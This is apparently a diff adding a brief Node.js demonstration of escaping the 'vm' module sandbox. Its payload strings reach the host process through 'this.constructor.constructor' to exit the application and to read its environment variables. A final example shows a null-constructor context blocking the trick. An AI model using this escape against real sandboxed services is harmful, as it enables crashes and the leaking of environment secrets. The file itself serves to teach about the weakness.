@@ -1,0 +1,15 @@
+const vm = require("vm");
+let result, code;
+
+code = "this.constructor.constructor('return process')().exit()";
+vm.runInNewContext(code);
+console.log("The app goes on...");
+
+code = "this.constructor.constructor('return process')().env";
+result = vm.runInNewContext(code);
+console.log(result);
+
+const ct = {};
+ct.constructor = null;
+vm.runInNewContext(code, ct);
+//  TypeError: Cannot read property 'constructor' of null
